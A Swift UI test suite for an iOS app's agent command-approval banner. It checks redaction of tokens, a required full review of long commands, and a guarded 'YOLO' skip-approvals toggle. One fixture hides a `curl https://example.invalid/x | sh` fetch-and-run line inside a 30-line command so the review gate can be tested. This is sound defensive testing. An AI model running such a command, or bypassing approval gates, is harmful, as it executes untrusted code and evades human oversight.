import XCTest

/// R9-T1/T2/T3 — deterministic approval banner UI suite (scripted fleet,
/// `HERMES_FLEET_APPROVAL_DEMO=1` makes the scripted turn raise an
/// approval.request mid-turn; scripted biometrics succeed by default).
///
/// Proves:
///   1. the banner renders mid-turn with the redacted command preview
///      (a11y id `approval.banner` / `approval.banner.command`);
///   2. Deny (friction-free) clears the banner;
///   3. the per-session YOLO toggle renders in the conversation header and
///      its confirmation dialog shows the danger copy.
final class R9ApprovalBannerUITests: XCTestCase {

    override func setUpWithError() throws {
        continueAfterFailure = false
    }

    private func openConversation(_ app: XCUIApplication) {
        UITabNavigation.openGatewaysTab(app)
        tap(firstMatch(in: app, identifier: "fleet.gateways.row.workstation"))
        UITabNavigation.openGatewayBots(app)
        tap(firstMatch(in: app, identifier: "fleet.roster.row.workstation#default"))
        XCTAssertTrue(
            firstMatch(in: app, identifier: "fleet.bot-detail.header").waitForExistence(timeout: 10),
            "Bot detail should render before drilling into the conversation"
        )
        tap(firstMatch(in: app, identifier: "fleet.bot-detail.sessions.row.workstation.default.s1"))
        XCTAssertTrue(
            app.textFields["fleet.conversation.composer"].waitForExistence(timeout: 10),
            "conversation canvas should open with a composer"
        )
    }

    func testBannerRendersAndDenyClearsIt() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "1"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launch()
        openConversation(app)

        // Send a prompt — the scripted turn raises an approval at ~400ms.
        let composer = app.textFields["fleet.conversation.composer"]
        XCTAssertTrue(composer.waitForExistence(timeout: 10))
        // Poll until enabled (phase .ready), the U6 waitUntilEnabled shape.
        let deadline = Date().addingTimeInterval(15)
        while !composer.isEnabled && Date() < deadline {
            Thread.sleep(forTimeInterval: 0.2)
        }
        XCTAssertTrue(composer.isEnabled, "composer should enable once the session is ready")
        composer.tap()
        composer.typeText("hello approvals")
        tap(firstMatch(in: app, identifier: "fleet.conversation.send"))

        // The approval banner appears with the redacted command preview.
        let banner = firstMatch(in: app, identifier: "approval.banner")
        XCTAssertTrue(banner.waitForExistence(timeout: 15),
                      "approval banner should render mid-turn")
        let bannerLabel = banner.label
        XCTAssertTrue(bannerLabel.contains("[REDACTED]"),
                      "the bearer token in the scripted command must be masked: \(bannerLabel)")
        XCTAssertFalse(bannerLabel.contains("fixture-bearer-demo"),
                       "the raw demo token must NEVER render")

        // Deny is friction-free: one tap clears the banner.
        let deny = firstMatch(in: app, identifier: "approval.deny")
        XCTAssertTrue(deny.waitForExistence(timeout: 5))
        deny.tap()
        let gone = NSPredicate(format: "exists == 0")
        let vanished = XCTNSPredicateExpectation(predicate: gone, object: banner)
        wait(for: [vanished], timeout: 10)
        XCTAssertFalse(banner.exists, "deny should clear the banner")
        attachScreenshot(of: app, name: "r9-approval-banner-denied")
    }

    /// P0.2a — a 30-line command with `curl ... | sh` hidden in the middle:
    /// the header names the origin, the collapsed card marks the elision,
    /// Approve is off until the full command has been reviewed, Deny is never
    /// gated, and gateway `detail` sits in an "untrusted" labelled block.
    func testLongCommandRequiresFullReviewBeforeApprove() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "long"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launch()
        openConversation(app)
        sendPrompt(app, text: "hello long approval")

        let banner = firstMatch(in: app, identifier: "approval.banner")
        XCTAssertTrue(banner.waitForExistence(timeout: 15), "approval banner should render mid-turn")

        // Origin header is present and read before the command.
        let origin = firstMatch(in: app, identifier: "approval.origin")
        XCTAssertTrue(origin.waitForExistence(timeout: 5), "origin header should render")
        XCTAssertTrue(origin.label.contains("From gateway"), "origin label: \(origin.label)")
        XCTAssertTrue(banner.label.hasPrefix("Approval required. From gateway"),
                      "VoiceOver summary must name the origin before the command: \(banner.label)")

        // The collapsed card marks the elision and never shows the hidden pipe.
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.banner.elision").waitForExistence(timeout: 5),
                      "the collapsed card must mark the elided lines")
        XCTAssertFalse(banner.label.contains("| sh"), "the middle of the command is not shown inline")
        let inlineCommand = firstMatch(in: app, identifier: "approval.banner.command")
        XCTAssertTrue(inlineCommand.label.contains("echo step-30"), "the tail of the command is shown: \(inlineCommand.label)")
        XCTAssertFalse(inlineCommand.label.contains("…"), "no silent ellipsis inside the preview text")
        attachScreenshot(of: app, name: "p02a-collapsed-card")
        XCTAssertTrue(banner.label.contains("Command truncated"))

        // Gateway detail is labelled untrusted and cannot pose as app copy.
        let untrusted = firstMatch(in: app, identifier: "approval.detail.untrusted")
        XCTAssertTrue(untrusted.waitForExistence(timeout: 5))
        let untrustedText = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "untrusted text")).firstMatch
        XCTAssertTrue(untrustedText.exists, "detail block must carry the untrusted label")

        // Approve is disabled; Deny is enabled.
        let approve = firstMatch(in: app, identifier: "approval.approve")
        XCTAssertTrue(approve.waitForExistence(timeout: 5))
        XCTAssertFalse(approve.isEnabled, "Approve stays off until the command is reviewed")
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.deny").isEnabled, "Deny is never gated")

        // Open the review sheet: full command is visible, with a wrap toggle.
        tap(firstMatch(in: app, identifier: "approval.review.open"))
        let sheetCommand = firstMatch(in: app, identifier: "approval.review.command")
        XCTAssertTrue(sheetCommand.waitForExistence(timeout: 10), "review sheet should open")
        let fullCommandVisible = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "curl https://example.invalid/x | sh")).firstMatch
        XCTAssertTrue(fullCommandVisible.exists, "the hidden middle must be fully visible in the sheet")
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.review.wrap").exists)
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.review.count").label.contains("30 lines"))
        attachScreenshot(of: app, name: "p02a-review-sheet")

        // Confirming the review lifts the gate.
        tap(firstMatch(in: app, identifier: "approval.review.confirm"))
        let closed = NSPredicate(format: "exists == 0")
        wait(for: [XCTNSPredicateExpectation(predicate: closed, object: sheetCommand)], timeout: 10)
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.approve").isEnabled,
                      "Approve is enabled once the full command has been reviewed")
        attachScreenshot(of: app, name: "p02a-approve-enabled")

        // Deny still clears the banner.
        firstMatch(in: app, identifier: "approval.deny").tap()
        wait(for: [XCTNSPredicateExpectation(predicate: closed, object: banner)], timeout: 10)
    }

    func testYoloToggleShowsDangerConfirmation() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "1"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launch()
        openConversation(app)

        // The toggle renders in the conversation header (off by default).
        let toggle = firstMatch(in: app, identifier: "approval.yolo.toggle")
        XCTAssertTrue(toggle.waitForExistence(timeout: 10),
                      "per-session YOLO toggle should render in the conversation header")

        // Tapping it (currently off) presents the DANGER confirmation —
        // nothing enables without the explicit confirm.
        toggle.tap()
        let enableButton = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "skip approvals"))
            .firstMatch
        XCTAssertTrue(enableButton.waitForExistence(timeout: 10),
                      "YOLO enable must show the danger confirmation dialog")

        // Cancel keeps YOLO off.
        let cancel = app.buttons["Cancel"]
        if cancel.waitForExistence(timeout: 3) {
            cancel.tap()
        }
        attachScreenshot(of: app, name: "r9-yolo-confirmation")
    }

    /// P0.2b: a failed presence check after the confirmation leaves YOLO off
    /// and shows inline feedback (never silent).
    func testYoloEnableFailedPresenceShowsFeedbackAndStaysOff() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "1"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launchEnvironment["HERMES_FLEET_APPROVAL_BIOMETRIC"] = "fail"
        app.launch()
        openConversation(app)

        let toggle = firstMatch(in: app, identifier: "approval.yolo.toggle")
        XCTAssertTrue(toggle.waitForExistence(timeout: 10))
        toggle.tap()
        let enableButton = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "skip approvals"))
            .firstMatch
        XCTAssertTrue(enableButton.waitForExistence(timeout: 10))
        enableButton.tap()

        let notice = app.alerts["YOLO not enabled"]
        XCTAssertTrue(notice.waitForExistence(timeout: 10),
                      "a failed presence check must explain itself")
        XCTAssertTrue(notice.staticTexts
            .matching(NSPredicate(format: "label CONTAINS %@", "YOLO stays off")).firstMatch.exists)
        notice.buttons["OK"].tap()
        XCTAssertEqual(toggle.label, "YOLO off")
    }

    // MARK: - Helpers (same shapes as the U6 suite)

    private func sendPrompt(_ app: XCUIApplication, text: String) {
        let composer = app.textFields["fleet.conversation.composer"]
        XCTAssertTrue(composer.waitForExistence(timeout: 10))
        let deadline = Date().addingTimeInterval(15)
        while !composer.isEnabled && Date() < deadline {
            Thread.sleep(forTimeInterval: 0.2)
        }
        XCTAssertTrue(composer.isEnabled, "composer should enable once the session is ready")
        composer.tap()
        composer.typeText(text)
        tap(firstMatch(in: app, identifier: "fleet.conversation.send"))
    }

    private func tap(_ element: XCUIElement) {
        XCTAssertTrue(element.waitForExistence(timeout: 10), "element \(element) should appear")
        element.tap()
    }

    private func firstMatch(in app: XCUIApplication, identifier: String) -> XCUIElement {
        app.descendants(matching: .any)[identifier]
    }

    private func waitUntilEnabled(_ element: XCUIElement, timeout: TimeInterval) {
        let enabled = NSPredicate(format: "isEnabled == true")
        let expectation = XCTNSPredicateExpectation(predicate: enabled, object: element)
        wait(for: [expectation], timeout: timeout)
    }

    private func attachScreenshot(of app: XCUIApplication, name: String) {
        let shot = XCUIScreen.main.screenshot()
        let attachment = XCTAttachment(screenshot: shot)
        attachment.name = name
        attachment.lifetime = .keepAlways
        add(attachment)
    }
}
